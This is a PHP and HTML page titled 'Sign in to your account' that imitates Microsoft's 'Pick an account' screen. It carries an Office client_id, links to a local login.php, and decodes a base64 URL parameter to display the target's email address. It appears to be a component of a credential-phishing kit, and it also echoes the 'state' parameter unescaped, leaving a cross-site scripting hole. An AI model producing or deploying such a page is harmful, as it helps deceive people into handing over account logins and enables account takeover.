<?php

session_start();
if (isset($_GET['state'])) {
$state = $_GET['state'];
}
?>

<!DOCTYPE html>

<html lang="en" class="gr__localhost"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/another.css">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
	
	<style type="text/css">
    .background-logo {
    max-width: 256px;
    max-height: 36px;
    display: block;
    margin-left: auto;
    margin-right: auto;
	margin-top: auto;
}  
    </style>
</head>

<body data-gr-c-s-loaded="true">
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
		<div class="background-logo-holder"> <img class="background-logo" src="assets/images/logo.png" width="171px" height="36"> </div>
		<div style="height:25px;"></div>
            <div class="card">
                <div class="card-body">
                    
                    <div id="pick-account" style="">
                        <img style="margin-top: 25px; margin-left: 20px;" src="assets/images/logo.svg">
                        <h4 class="pl-1 m-3">Pick an account</h4>
                        <ul class="list-group">
                            <li class="list-group-item" onclick="return window.location=&#39;login.php?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&state=<?php echo isset($_GET['state']) ? $_GET['state'] : '' ?>&#39;;"><img src="assets/images/user2.svg"><?php echo isset($_GET['state']) ? base64_decode($_GET['state']) : '' ?><img class="mt-3 float-right" src="assets/images/more.svg"></li>
                            <li class="list-group-item" onclick="return window.location=&#39;index.php&#39;;"><img src="assets/images/plus.svg">Use another account</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>Privacy &amp; cookies</p>
    <p>Terms of use</p>
</div>
<script src="assets/js/custom.js"></script>

</body></html>